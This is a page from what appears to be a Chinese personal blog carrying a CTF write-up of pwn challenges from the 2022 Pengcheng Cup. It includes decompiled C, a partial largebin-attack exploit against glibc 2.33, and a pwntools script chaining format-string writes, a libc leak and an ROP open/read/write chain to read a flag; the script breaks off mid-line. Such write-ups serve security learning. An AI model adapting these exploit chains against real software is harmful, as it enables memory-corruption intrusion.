<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CharonPt的Blog">
<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/page/2/index.html">
<meta property="og:site_name" content="CharonPt的Blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>CharonPt的Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CharonPt的Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CharonPt的Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/05/2022%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn/" class="post-title-link" itemprop="url">2022鹏城杯初赛pwn</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-07-05 17:09:22" itemprop="dateCreated datePublished" datetime="2022-07-05T17:09:22+08:00">2022-07-05</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-09-06 11:03:14" itemprop="dateModified" datetime="2022-09-06T11:03:14+08:00">2022-09-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>坐了一天大牢一题没做出来，感觉是真难，赛后看别的师傅的WP时发现有好多没想到和没学过的点，感觉收获挺多，好好复现</p>
<p>这次比赛的堆题大多都用到了largebin_attack，感觉在新版本的glibc中会是比较常见的考点，还有IO_FILE那部分依然很重要，要多巩固这部分的知识。</p>
<h2 id="A-fruit"><a href="#A-fruit" class="headerlink" title="A_fruit"></a>A_fruit</h2><p>考点：largebin_attack、劫持mp_、orw。show函数部分有加密，目前看到两种思路：z3和爆破。</p>
<p>版本：glibc-2.33</p>
<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>漏洞是delete里的UAF，另外限制了malloc大小在<code>size &lt;= 0x40F || size &gt; 0x5F8</code>这个范围里，</p>
<p>菜单</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_B32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Add&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Edit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Show&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.Delete&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;5.Exit&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !Heap[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Input size:&quot;</span>);</span><br><span class="line">      size = sub_BFD();</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0x40F</span> || size &gt; <span class="number">0x5F8</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Size error!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        Size[i] = size;</span><br><span class="line">        Heap[i] = <span class="built_in">malloc</span>(Size[i]);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show功能函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input index:&quot;</span>);</span><br><span class="line">  v1 = sub_BFD();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">31</span> || !Heap[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Error!&quot;</span>);</span><br><span class="line">  sub_B75(*Heap[v1]);</span><br><span class="line">  <span class="keyword">return</span> sub_B75(*(Heap[v1] + <span class="number">4LL</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>里面用到的加密函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">sub_B75</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">10</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">    a1 ^= ((a1 ^ (<span class="number">0x30</span> * a1)) &gt;&gt; <span class="number">0x15</span>) ^ (<span class="number">0x30</span> * a1) ^ ((a1 ^ (<span class="number">0x30</span> * a1) ^ ((a1 ^ (<span class="number">0x30</span> * a1)) &gt;&gt; <span class="number">0x15</span>)) &lt;&lt; <span class="number">17</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>, a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h5 id="z3解show部分的加密"><a href="#z3解show部分的加密" class="headerlink" title="z3解show部分的加密"></a>z3解show部分的加密</h5><h4 id="pwn部分"><a href="#pwn部分" class="headerlink" title="pwn部分"></a>pwn部分</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">0x450</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">0x440</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)	<span class="comment">#leak libc</span></span><br><span class="line">show(<span class="number">2</span>)	<span class="comment">#leak heap</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">0x410</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x460</span>) <span class="comment">#1 into largebin</span></span><br><span class="line">edit(<span class="number">1</span>,p64(main_arena)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0x90</span> - <span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x460</span>) <span class="comment">#largebin attack</span></span><br><span class="line">add(<span class="number">0x440</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(main_arena)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(mp_ + <span class="number">0x50</span> - <span class="number">0x20</span>))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x460</span>) <span class="comment">#largebin attack</span></span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x430</span>) <span class="comment">#10 =&gt; free_hook</span></span><br></pre></td></tr></table></figure>

<p>通过两次largebin_attack来分别劫持<code>mp.tcache_bins</code>和在对应的<code>tcache-&gt;counts[tc_idx]</code>里写值，从而把<code>__free_hook</code>申请出来。剩下的orw部分很常规就不贴了</p>
<h2 id="one"><a href="#one" class="headerlink" title="one"></a>one</h2><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">2056</span>]; <span class="comment">// [rsp+0h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, s);</span><br><span class="line">  login();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, you can&#x27;t see anything!!!&quot;</span>);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;password:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序主体就这么些内容，保护全开，加了沙箱把execve跟execveat给禁了，所以orw。</p>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>复现时的思路参考了<a target="_blank" rel="noopener" href="https://kagehutatsu.com/?p=711">影二つ</a>师傅的博客</p>
<p>一个printf给了一个栈地址，然后在login中能泄漏一个程序地址</p>
<p>劫持格式化字符串printf的返回地址为start，跳两次start之后<code>_IO_2_1_stdout_</code>的指针残留在栈上，利用该指针把fileno改成2重新获得输出（这里需要爆破半个字节），泄漏libc之后就可以正常orw了，一个比较简单的orw方法是将printf的返回地址劫持成<code>add_rsp_ret</code>，因为read能在栈上输入0x200个字节，所以足够写完orw chain，再把rsp抬到orw chain的位置就可以正常执行了。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;name:&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendafter(<span class="string">b&quot;word&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">pgm = u64(p.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x11a0</span></span><br><span class="line">start = pgm + <span class="number">0x11A0</span></span><br><span class="line"></span><br><span class="line">b = ((start&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+<span class="number">0x100</span>-<span class="number">0xA0</span></span><br><span class="line">payload = <span class="string">b&#x27;%160c%10$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;c%11$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Now, you can&#x27;t see anything!!!&quot;</span>,payload)</span><br><span class="line"><span class="comment">#read = 148C</span></span><br><span class="line"><span class="comment">#p_ret = 14BE</span></span><br><span class="line"><span class="comment">#p_ret = stack - 0x8</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">b = ((start&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+<span class="number">0x100</span>-<span class="number">0xA0</span></span><br><span class="line">payload = <span class="string">b&#x27;%160c%10$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;c%11$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x908</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x907</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">a = ((stack-<span class="number">0x910</span>)&amp;<span class="number">0xff</span>)-<span class="number">0x50</span>+<span class="number">0x100</span></span><br><span class="line">b = <span class="number">0x28c</span> - a</span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(a).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%11$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1208</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x910</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">a = ((stack-<span class="number">0x910</span>)&amp;<span class="number">0xff</span>)-<span class="number">0x50</span>+<span class="number">0x100</span>+<span class="number">1</span></span><br><span class="line">b = a-<span class="number">140</span></span><br><span class="line">payload = <span class="string">b&#x27;%16c%292$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%124c%11$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(b).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%12$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1208</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x910</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%23c%292$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%117c%11$hhn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1208</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%2c%282$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%138c%11$hhn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%265$p&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(stack-<span class="number">0x1208</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - (<span class="number">0x7ffff7dc8083</span> - <span class="number">0x7ffff7da4000</span>)</span><br><span class="line">add_rsp = <span class="number">0x0000000000024242</span> + libc_base</span><br><span class="line"><span class="comment">#add rsp 0x98</span></span><br><span class="line">pop_rsi = <span class="number">0x000000000002601f</span> + libc_base</span><br><span class="line">pop_rdi = <span class="number">0x0000000000023b6a</span> + libc_base</span><br><span class="line">pop_rdx = <span class="number">0x0000000000142c92</span> + libc_base</span><br><span class="line">ope = libc_base + libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">flag_addr = stack - <span class="number">0x1200</span> + <span class="number">0x90</span></span><br><span class="line">orw = <span class="string">b&#x27;flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">orw += p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(ope)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(stack) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(read)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">2</span>) + p64(pop_rsi) + p64(stack) + p64(pop_rdx) + p64(<span class="number">0x20</span>) + p64(write)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0x14B9)&#x27;)</span></span><br><span class="line">a = add_rsp&amp;<span class="number">0xffff</span></span><br><span class="line">b = ((add_rsp&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)-a+<span class="number">0x10000</span></span><br><span 